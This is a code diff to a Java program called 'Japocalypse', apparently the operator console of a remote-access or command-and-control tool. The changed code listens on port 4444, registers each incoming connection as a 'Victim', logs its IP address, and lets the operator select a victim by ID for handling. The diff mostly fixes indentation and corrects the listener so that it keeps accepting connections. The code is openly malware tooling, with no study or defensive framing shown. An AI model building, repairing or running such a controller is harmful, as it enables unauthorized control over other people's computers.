@@ -15,7 +15,7 @@ public class Japocalypse {
     private ArrayList<Command> commands = new ArrayList<>();
     private Scanner scanner = new Scanner(System.in);
     private String[] identifiers = {"-i"};
-	
+
     public Japocalypse() {
         loadCommands();
         new Thread(new AcceptConnections(victimList)).start();
@@ -65,7 +65,7 @@ public class Japocalypse {
             }
             else {
                 if(args[0].equals("-i")) {
-                   try {
+                    try {
                         int id = Integer.parseInt(args[1]);
                         int index = indexOf(victimList,id);
 
@@ -76,13 +76,13 @@ public class Japocalypse {
 
                         handleVictim(victimList.get(index));
 
-                   }
-                   catch(NumberFormatException e) {
-                       System.out.println("Invalid argument: "+args[1]);
-                   }
-                   catch(IndexOutOfBoundsException e) {
-                       System.out.println("Missing argument");
-                   }
+                    }
+                    catch(NumberFormatException e) {
+                        System.out.println("Invalid argument: "+args[1]);
+                    }
+                    catch(IndexOutOfBoundsException e) {
+                        System.out.println("Missing argument");
+                    }
                 }
                 else {
                     System.out.println("Cannot find command");
@@ -130,16 +130,21 @@ class AcceptConnections implements Runnable {
 
     @Override
     public void run() {
-        while(true) {
-            try {
-                ServerSocket serverSocket = new ServerSocket(4444);
-                Victim victim = new Victim(serverSocket.accept());
-                list.add(victim);
-                System.out.println(victim.getID() + " connected: "+victim.getSocket().getInetAddress().getHostAddress());
+        try {
+            ServerSocket serverSocket = new ServerSocket(4444);
+            while(true) {
+                try {
+                    Victim victim = new Victim(serverSocket.accept());
+                    list.add(victim);
+                    System.out.println(victim.getID() + " connected: " + victim.getSocket().getInetAddress().getHostAddress());
+                }
+				catch (IOException ex) {
 
-            } catch (IOException ex) {
-
+                }
             }
+        }
+		catch (IOException ex) {
+
         }
     }
 }
